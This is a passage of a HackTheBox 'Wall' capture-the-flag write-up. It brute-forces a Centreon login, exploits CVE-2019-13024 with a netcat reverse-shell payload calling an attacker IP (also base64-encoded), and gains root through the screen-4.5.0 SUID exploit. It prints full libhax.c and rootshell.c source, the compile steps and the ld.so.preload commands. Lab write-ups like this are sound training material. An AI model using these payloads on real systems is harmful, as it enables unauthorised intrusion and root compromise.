class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash shell</span></span><br><span class="line">python3 brutecsrf.py --url http://test.com/index.php --csrf name_csrf_token_in_HTML_form --u admin --fuser user_name_in_HTML_form --passwd password_name_in_HTML_form</span><br></pre></td></tr></table></figure><p><img src="/img/wall/password1.png" alt="HackTheBox-Wall/password1.png" title="Login page password"></p><p>After a minute I get the ‚Äúpassword1‚Äù now try to use this password for login with default username ‚Äúadmin‚Äù ;) then I can now logged in !</p><p><img src="/img/wall/centreon.png" alt="HackTheBox-Wall/centreon.png"><br><strong>Centreon Main Page</strong></p><hr><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>We know that the Centreon version on this machine was vulnerable to RCE(<a href="https://www.sciencedirect.com/topics/computer-science/remote-code-execution" target="_blank" rel="noopener">Remote Code Execution</a>) attack. So I did search on Google to find an article about it and what I saw was article from creator (Askar) of this box.</p><p><img src="/img/wall/google1.png" alt="HackTheBox-Wall/google1.png"></p><h2 id="Exploit-Blog-for-Centreon"><a href="#Exploit-Blog-for-Centreon" class="headerlink" title="Exploit Blog for Centreon"></a>Exploit Blog for Centreon</h2><p>Centreon v19.04 Remote Code Execution. (CVE-2019-13024)</p><a href="https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/" class="link-preview" target="rel"><div class="link-area"><div class="og-image"><img src="https://shells.systems/wp-content/uploads/2019/06/post-exploit.png"></img></div><div class="descriptions"><div class="og-title">Centreon v19.04 Remote Code Execution (CVE-2019-13024) - Shells.Systems</div><div class="og-description">Estimated Reading Time:  6 minutes Summary about Centreon Centreon is ‚Ä¶</div></div></div></a><hr><p>The exploitation triggers by adding an arbitrary command in the <code>nagios_bin</code> parameter when setup a new configuration or update configuration for a poller.</p><p><img src="/img/wall/payload_line.png" alt="HackTheBox-Wall/payload_line.png"></p><p>Based on the blog we can set a payload in <code>Monitoring Engine Binary</code>.</p><p>I tried to use the exploit script but it‚Äôs not working, I didn‚Äôt get a reverse shell, my Ncat listener can‚Äôt get any response whenever I run the exploit even I modified it.<br>So i tried to encode my payload into base64 hoping that this one will work.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># My payload</span></span><br><span class="line">rm /tmp/x22;mkfifo /tmp/xx2;cat /tmp/xx2|/bin/sh -i 2&gt;&amp;1|/bin/nc 10.10.15.44 666 &gt;/tmp/xx2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># convert to base64</span></span><br><span class="line">cm0gL3RtcC94MjI7bWtmaWZvIC90bXAveHgyO2NhdCAvdG1wL3h4MnwvYmluL3NoIC1pIDI+JjF8L2Jpbi9uYyAxMC4xMC4xNS40NCA2NjYgPi90bXAveHgy</span><br></pre></td></tr></table></figure><p>Now I will paste our base64 code payload into <code>Monitoring Engine Binary</code>.</p><p>In the exploit script i will paste my payload too in <code>nagios_bin</code> line. with echo${IFS}</p><p>After running the exploit with my Ncat listener, still didn‚Äôt work. So I tried to search again on Google to look for other exploit of Centreon RCE and i found <a href="https://github.com/get-get-get-get/Centreon-RCE" target="_blank" rel="noopener">this.</a> Same procedure I will paste again my payload to <code>nagios_bin</code> line and next is run the exploit with my Ncat listener.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./centreon_rce.py -t http://10.10.10.157/centreon -u admin -p password1</span><br></pre></td></tr></table></figure><h3 id="WWW-DATA-SHELL-gt-shelby"><a href="#WWW-DATA-SHELL-gt-shelby" class="headerlink" title="WWW-DATA SHELL -&gt; shelby"></a>WWW-DATA SHELL -&gt; shelby</h3><p>Running this and we now get the www-data shell.<br><img src="/img/wall/www_data_shell.png" alt="HackTheBox-Wall/www_data_shell.png" title="WWW-DATA SHELL"></p><p>As you can see Bash‚Äôs job control is turned off. using this line we can enable bash command in the shell.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> TERM=xterm</span><br></pre></td></tr></table></figure><p>Now I can use commands like ‚Äúid‚Äù.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data),6000(centreon)</span><br></pre></td></tr></table></figure><p>upgrade the shell with python</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import pty; pty.spawn("/bin/bash");'</span></span><br></pre></td></tr></table></figure><p><img src="/img/wall/right_shell.png" alt="HackTheBox-Wall/right_shell.png" title="www-data@Wall shell"></p><hr><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Linux-SUID-Binaries"><a href="#Linux-SUID-Binaries" class="headerlink" title="Linux SUID Binaries"></a>Linux SUID Binaries</h3><p>Now it‚Äôs time to find some interesting things in this machine that I can use for Privilege Escalation. First I look into Linux SUID binaries. and I spotted something odd, the <code>screen</code> with version 4-5.0 was the biggest hint for me.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null | xargs ls -la</span><br></pre></td></tr></table></figure><p><img src="/img/wall/screen.png" alt="HackTheBox-Wall/screen.png" title="screen-4-5.0"></p><h3 id="Screen-4-5-0"><a href="#Screen-4-5-0" class="headerlink" title="Screen 4-5.0"></a>Screen 4-5.0</h3><p>If you are familiar with Linux SUID‚Äô you will notice that the ‚Äú/bin/screen-4.5.0‚Äù is not a normally or default Linux suid so this one is very interesting so trying to use <a href="https://github.com/offensive-security/exploitdb/blob/master/searchsploit" target="_blank" rel="noopener">Searchsploit</a> if there‚Äôs an existing exploit in ‚Äúscreen-4.5.0‚Äù. And there is.</p><p><img src="/img/wall/searchsploit.png" alt="HackTheBox-Wall/searchsploit.png" title="searchsploit results"></p><p>I read first the .txt file of the exploit to know on how can I use this for exploitation.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit -x exploits/linux/<span class="built_in">local</span>/41152.txt</span><br></pre></td></tr></table></figure><p><img src="/img/wall/screen_readme.png" alt="HackTheBox-Wall/screen_readme.png" title="screen readme"></p><p>It check opens the logfile with full root privileges. This allows us to truncate any file or create a root-owned file with any contents in any directory and can be easily exploited to full root acces in several ways.</p><p>Base on the instructions of the exploit, I will try to create a file ‚Äúbla-bla‚Äù then use this commands ‚Äúls -la‚Äù</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">screen -D -m -L bla.bla <span class="built_in">echo</span> fail</span><br><span class="line"></span><br><span class="line">ls -la</span><br></pre></td></tr></table></figure><p><img src="/img/wall/blabla.png" alt="HackTheBox-Wall/blabla.png" title="blabla"></p><p>As you can see, the ‚Äúbla.bla‚Äù file is owned by root.</p><p>I will now use the exploit script we get on the searchsploit, but it didn‚Äôt work properly so I did it manually, first I compiled the binaries on my Kali machine:</p><h3 id="libhax-c-code"><a href="#libhax-c-code" class="headerlink" title="libhax.c - code"></a>libhax.c - code</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// libhax</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dropshell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    chown(<span class="string">"/tmp/rootshell"</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">"/tmp/rootshell"</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">"/etc/ld.so.preload"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] done!\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="rootshell-c-code"><a href="#rootshell-c-code" class="headerlink" title="rootshell.c - code"></a>rootshell.c - code</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// rootshell</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">"/bin/sh"</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Now is to compile this two exploit.</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// libhax</span></span><br><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br><span class="line"></span><br><span class="line"><span class="comment">// and then the rootshell</span></span><br><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure><p>After I compile the exploit i‚Äôll transfer it to the target. To transfer the file I set a local HTTP Server in my Kali machine.</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">80</span></span><br></pre></td></tr></table></figure><p>to download it into Wall machine, we can use <code>wget</code> commands in the <code>tmp</code> directory.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># download the libhax</span></span><br><span class="line">wget http://10.10.15.44/libhax.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># next is the rootshell</span></span><br><span class="line">wget http://10.10.15.44/libhax.c</span><br></pre></td></tr></table></figure><h3 id="Going-to-Root"><a href="#Going-to-Root" class="headerlink" title="Going to Root"></a>Going to Root</h3><p>Now i will go to the ‚Äú/etc/‚Äú directories in the target and do the exploit</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@Wall:&#x2F;tmp$ cd &#x2F;etc</span><br><span class="line">cd &#x2F;etc</span><br><span class="line">www-data@Wall:&#x2F;etc$ umask 000</span><br><span class="line">umask 000</span><br><span class="line">www-data@Wall:&#x2F;etc$ &#x2F;bin&#x2F;screen-4.5.0 -D -m -L ld.so.preload echo -ne  &quot;\x0a&#x2F;tmp&#x2F;libhax.so&quot;</span><br><span class="line">&#x2F;libhax.so&quot;-4.5.0 -D -m -L ld.so.preload echo -ne  &quot;\x0a&#x2F;tmp&#x2F;</span><br><span class="line">www-data@Wall:&#x2F;etc$ &#x2F;bin&#x2F;screen-4.5.0 -ls</span><br><span class="line">&#x2F;bin&#x2F;screen-4.5.0 -ls</span><br><span class="line">&#39; from &#x2F;etc&#x2F;ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span><br><span class="line">[+] done!</span><br><span class="line">No Sockets found in &#x2F;tmp&#x2F;screens&#x2F;S-www-data.</span><br></pre></td></tr></table></figure><p>Now going to ‚Äú/tmp/rootshell‚Äù</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@Wall:&#x2F;etc$ &#x2F;tmp&#x2F;rootshell</span><br><span class="line">&#x2F;tmp&#x2F;rootshell</span><br><span class="line"># id</span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),33(www-data),6000(centreon)</span><br><span class="line"># cat &#x2F;home&#x2F;shelby&#x2F;user.txt | wc -c</span><br><span class="line">cat &#x2F;home&#x2F;shelby&#x2F;user.txt | wc -c</span><br><span class="line">33</span><br><span class="line"># cat &#x2F;root&#x2F;root.txt | wc -c</span><br><span class="line">cat &#x2F;root&#x2F;root.txt | wc -c</span><br><span class="line">33</span><br><span class="line">#</span><br></pre></td></tr></table></figure><p><img src="/img/wall/rooted!!.png" alt="HackTheBox-Wall/rooted!!.png" title="Machine Pawned!!"></p><p>Now that I‚Äôm root, I can now grab both flags ‚Äì <code>user.txt</code> &amp; <code>root.txt</code> :)</p><p>If you liked my writeup please leave a respect on my <a href="https://www.hackthebox.eu/profile/128965" target="_blank" rel="noopener">Profile</a></p><p><img src="https://www.hackthebox.eu/badge/image/128965" alt="Payas0" title="Payas0"></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
          <category> PenTesting </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rce </tag>
            
            <tag> linux </tag>
            
            <tag> retired </tag>
            
            <tag> ctf </tag>
            
            <tag> cve </tag>
            
            <tag> pentest </tag>
            
            <tag> htb </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
